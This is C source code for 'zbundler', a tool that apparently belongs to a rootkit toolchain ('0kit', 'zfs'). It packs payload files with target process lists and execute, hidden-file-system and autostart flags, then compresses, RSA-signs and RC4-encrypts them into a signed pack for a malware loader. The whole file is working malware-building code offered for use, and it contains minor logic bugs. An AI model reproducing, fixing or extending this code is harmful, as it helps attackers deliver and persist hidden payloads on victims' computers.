#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>

#include "../../../shared/platform.h"
#include "../../../shared/types.h"
#include "../../../shared/native.h"
#include "../../../shared/config.h"
#include "../../../shared/utils_cli.h"
#include "../../../shared/bignum.h"
#include "../../../shared/bn_mul.h"
#include "../../../shared/rsa.h"
#include "../../../shared/lzma.h"
#include "../../../shared/sha1.h"
#include "../../../shared/arc4.h"

#include "../../../zfs/zfs/config.h"
#include "../../../0kit/mod_shared/pack_protect.h"

#include "../../../shared/arc4.c"
#define MPI_USE_FILE_IO 1
#define USE_STRING_IO 1
#define USE_STRING_WRITE_IO 1
#include "../../../shared/bignum.c"
#include "../../../shared/rsa.c"

#undef HASH_PADDING
#include "../../../shared/sha1.c"

#define USE_LZMA_COMPRESSOR 1
#include "../../../shared/lzma.c"

#define ZBUNDLER_VERSION "0.7.2"

typedef struct cmd_options
{
    char** filesPath; // Путь до 32-битной версии файла.
    char* privKeyPath; // путь до файла закрытого ключа.
    char* outPath; // Путь с именем файла для сгенерированного пака.
    char* bundleName; // Имя бандла.
    uint32_t lifetime; // Время жизни бандла.
    uint32_t updatePeriod; // Период обновления бандла в минутах.
    char* bflags; // Флаги для бандла.
} cmd_options_t, *pcmd_options_t;

cmd_options_t gCmdOptions;

cmd_line_info_t cmdLineInfo = {7,
{
    {{"f", "file"}, "File description (path, platform, flags)", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING_ARRAY, (void*)&gCmdOptions.filesPath},
    {{"k", "key"}, "Path to key for signing", "Specify nonempty path", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.privKeyPath},
    {{"o", "out"}, "Output path", "Specify nonempty path", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.outPath},
    {{"n", "name"}, "Bundle name", "Specify nonempty name", OPT_FLAG_REQUIRED, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.bundleName},
    {{"l", "lifetime"}, "Lifetime in hours for bundle", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.lifetime},
    {{"u", "update"}, "Update period in minutes", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_UINT32, (void*)&gCmdOptions.updatePeriod},
    {{"b", "bflags"}, "Bundle flags", "", OPT_FLAG_OPTIONAL, TYPE_CMDLINE | TYPE_STRING, (void*)&gCmdOptions.bflags},
}
};

int __cdecl main(int argc, char** argv)
{
    int err, ret = EXIT_FAILURE;
    pbundle_header_t pBundleHeader;
    uint32_t i, j, bundleSize = 0, origSize, sz, sz1;
    char* bundleBuffer = NULL;
    char outPath[MAX_PATH];
    uint32_t bundleNameLen;
    FILE* keyFile;
    rsa_context_t rsa;
    CLzmaEncProps props;
    uint32_t outSize;
    uint8_t* outData = NULL;
    unsigned propsSize = LZMA_PROPS_SIZE;
    psign_pack_header_t pSignPackHeader;
    uint8_t hash[20];
    char ch;

    memset(&gCmdOptions, 0, sizeof(gCmdOptions));
    if (config_parse_cmdline(argc, argv, &cmdLineInfo, ZBUNDLER_VERSION) != 0) {
        return ret; 
    }

    printf("\n>>> zbundler\n\n");

    do {
        if (cmdLineInfo.cmdOptionHelpers[0].arraySize == 0) {
            printf("Error: you must specify at the minimum one file\n");
            break;
        }

        printf(" Checking parameters...");
        bundleNameLen = strlen(gCmdOptions.bundleName);
        if (bundleNameLen >= 32) {
            printf("Error: too long bundle name: %s\n", gCmdOptions.bundleName);
            break;
        }

        if (utils_file_exists(gCmdOptions.privKeyPath) != ERR_OK) {
            printf("Error: %s not exists\n", gCmdOptions.privKeyPath);
            break;
        }

        printf("OK\n Reading private key from %s...", gCmdOptions.privKeyPath);
        if ((keyFile = fopen(gCmdOptions.privKeyPath, "rb")) == NULL) {
            printf("Error: cannot open file\n");
            break;
        }

        rsa_init(&rsa, RSA_PKCS_V15, 0);

        if ((err = mpi_read_file(&rsa.N , 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.E , 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.D , 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.P , 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.Q , 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.DP, 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.DQ, 16, keyFile)) != 0 ||
            (err = mpi_read_file(&rsa.QP, 16, keyFile)) != 0) {
            printf("Error: cannot read MPI number (%d)\n", err);
            break;
        }

        rsa.len = (mpi_msb(&rsa.N) + 7) >> 3;
        fclose(keyFile);

        printf("OK\n Building bundle's header...");

        bundleSize = sizeof(bundle_header_t);
        bundleBuffer = (char*)malloc(bundleSize);
        if (bundleBuffer == NULL) {
            printf("Error: cannot allocate memory for bundle\n");
            break;
        }

        pBundleHeader = (pbundle_header_t)bundleBuffer;
        memset(pBundleHeader, 0, sizeof(bundle_header_t));
        pBundleHeader->nameLen = bundleNameLen;
        strcpy(pBundleHeader->name, gCmdOptions.bundleName);
        pBundleHeader->numberOfFiles = cmdLineInfo.cmdOptionHelpers[0].arraySize;
        pBundleHeader->lifetime = gCmdOptions.lifetime;
        pBundleHeader->updatePeriod = gCmdOptions.updatePeriod;

        if (gCmdOptions.bflags != NULL) {
            ch = 0;
            sz = strlen(gCmdOptions.bflags);
            for (i = 0; i < sz; ++i) {
                switch (gCmdOptions.bflags[i]) {
                    case 'u':
                        pBundleHeader->flags |= BFLAG_UPDATE;
                        break;
                    default:
                        ch = gCmdOptions.bflags[i];
                        i = 77;
                        break;
                }
            }

            if (ch != 0) {
                printf("Error: unknown bundle flag: %c\n", ch);
                break;
            }
        }

        printf("OK\n");

        sz = cmdLineInfo.cmdOptionHelpers[0].arraySize;
        for (i = 0; i < sz; ++i) {
            char* fileInfo = gCmdOptions.filesPath[i];
            char *filePath, *targetName, *processes, *flags;
            uint32_t fflags = 0, processesCount = 0;
            pbundle_file_header_t pFileHeader;
            uint32_t fileSize = 0, fileHeaderSize;
            char *ptr, *ptr1, *ptr2, *fileBuffer = NULL;
            char* newPackBuffer;

            printf(" Processing file:\n");

            filePath = fileInfo;
            if ((ptr = strstr(fileInfo, "*")) == NULL) {
                printf("Error: cannot found file path\n");
                break;
            }
            *ptr = '\0';
            printf("  Path: %s", filePath);
            if (utils_file_exists(filePath) != ERR_OK) {
                printf(" (Error: file not exists)\n");
                break;
            }
            if (utils_read_file(filePath, &fileBuffer, &fileSize) != ERR_OK) {
                printf(" (Error: cannot read file)\n");
                goto exit;
            }

            targetName = ptr + 1;
            if (*targetName == '\0' || (ptr = strstr(targetName, "*")) == NULL) {
                printf("Error: cannot found target name\n");
                goto exit;
            }
            *ptr = '\0';
            printf("\n  Target name: %s\n", targetName);
            if (strlen(targetName) >= ZFS_MAX_FILENAME) {
                printf(" (Error: too long target name)\n");
                break;
            }

            processes = ptr + 1;
            if (*processes == '\0' || (ptr = strstr(processes, "*")) == NULL) {
                printf("Error: cannot found list of processes\n");
                goto exit;
            }
            *ptr = '\0';
            printf("  Processes: %s\n", processes);

            flags = ptr + 1;
            if (*flags == '\0' || (ptr = strstr(processes, "*")) != NULL) {
                printf("Error: cannot found flags\n");
                goto exit;
            }
            printf("  Flags: %s", flags);
            sz1 = strlen(flags);
            ch = 0;
            for (j = 0; j < sz1; ++j) {
                switch (flags[j]) {
                    case 'q':
                        fflags |= FLAG_IS64;
                        break;
                    case 'x':
                        fflags |= FLAG_EXEC;
                        break;
                    case 's':
                        fflags |= FLAG_SAVE_TO_FS;
                        break;
                    case 'a':
                        fflags |= FLAG_AUTOSTART;
                        break;
                    default:
                        ch = flags[j];
                        j = 77;
                        break;
                }
            }
            if (ch != 0) {
                printf(" (Error: unknown flag: %c)\n", ch);
                break;
            }

            printf("\n");

            // Подсчитываем количество процессов в списке.
            ptr = strstr(processes, ";");
            ++processesCount;
            for ( ; ptr != NULL; ) {
                if (*(ptr + 1) == '\0') {
                    break;
                }
                ptr = strstr(ptr + 1, ";");
                ++processesCount;
            }

            fileHeaderSize = sizeof(bundle_file_header_t) + sizeof(pFileHeader->process1Name) * (processesCount - 1);
            newPackBuffer = realloc(bundleBuffer, bundleSize + fileSize + fileHeaderSize);
            if (newPackBuffer == NULL) {
                printf("Error: cannot reallocate memory for bundle\n");
                break;
            }
            pFileHeader = (pbundle_file_header_t)(newPackBuffer + bundleSize);
            memset(pFileHeader, 0, fileHeaderSize);
            strcpy(pFileHeader->fileName, targetName);
            pFileHeader->processesCount = processesCount;
            pFileHeader->fileSize = fileSize;
            pFileHeader->flags = fflags;
            
            if (*processes == '\0') {
                pFileHeader->process1Name[0]= ANY_PROCESS;
            }
            else {
                ptr1 = pFileHeader->process1Name;
                ptr = processes - 1;
                for ( ; ptr != NULL; ) {
                    ptr2 = ++ptr;
                    if (*ptr == '\0') {
                        break;
                    }
                    ptr = strstr(ptr, ";");

                    if (ptr != NULL) {
                        *ptr = '\0';
                    }

                    strcpy(ptr1, ptr2);
                    ptr1 += sizeof(pFileHeader->process1Name);
                }
            }

            memcpy((char*)pFileHeader + fileHeaderSize, fileBuffer, fileSize);
            bundleSize += fileSize + fileHeaderSize;
            bundleBuffer = newPackBuffer;
            free(fileBuffer);

            printf(" Complete!\n");
        }

        if (i < sz) {
            break;
        }

        pBundleHeader = (pbundle_header_t)bundleBuffer;
        pBundleHeader->sizeOfPack = bundleSize - sizeof(bundle_header_t);
        origSize = bundleSize;

        printf(" Compressing bundle...");
        LzmaEncProps_Init(&props);
        props.dictSize = 1048576; // 1 MB

        outSize = bundleSize + bundleSize/3 + 128 - LZMA_PROPS_SIZE;
        outData = malloc(outSize);

        if ((err = LzmaEncode(&outData[LZMA_PROPS_SIZE], &outSize, bundleBuffer, bundleSize, &props, outData, &propsSize)) != ERR_OK) {
            printf("Error: cannot compress pack (%d)\n", err);
            break;
        }

        bundleSize = outSize + propsSize;
        free(bundleBuffer);
        bundleBuffer = outData;

        printf("OK (compressed size = %u bytes)\n Signing bundle...", bundleSize);
        outSize = sizeof(sign_pack_header_t) + bundleSize;
        outData = (char*)malloc(outSize);
        if (outData == NULL) {
            printf("Error: cannot allocate memory\n");
            break;
        }

        pSignPackHeader = (psign_pack_header_t)outData;
        memset(pSignPackHeader, 0, sizeof(sign_pack_header_t));
        pSignPackHeader->sizeOfFile = outSize;
        memcpy(outData + sizeof(sign_pack_header_t), bundleBuffer, bundleSize);
        pSignPackHeader->origSize = origSize;
        memset(pSignPackHeader->sign, 0, sizeof(pSignPackHeader->sign));

        sha1(outData + sizeof(sign_pack_header_t), bundleSize, hash);
        if ((err = rsa_pkcs1_sign(&rsa, RSA_PRIVATE_MODE, SIG_RSA_SHA1, 20, hash, pSignPackHeader->sign)) != 0) {
            printf("Error: rsa_pkcs1_sign returned %d\n", err);
            break;
        }

        printf("OK\n Encrypting bundle...");
        arc4_crypt_self(outData + sizeof(sign_pack_header_t), bundleSize, hash, 20);

        strcpy(outPath, gCmdOptions.outPath);
        ch = outPath[strlen(outPath)];
        if (ch != '\\' || ch != '/') {
            strcat(outPath, "\\");
        }
        strcat(outPath, gCmdOptions.bundleName);
        strcat(outPath, ".zzz");

        printf("OK\n Saving bundle to %s...", outPath);
        if (utils_save_file(outPath, outData, outSize) != ERR_OK) {
            printf("Error: cannot save\n");
        }
        printf("OK\n");

        ret = EXIT_SUCCESS;
    } while (0);

exit:
    if (bundleBuffer != NULL) {
        free(bundleBuffer);
    }
    if (outData != NULL) {
        free(outData);
    }

    printf("\n<<< zbundler\n");

    return ret;
}
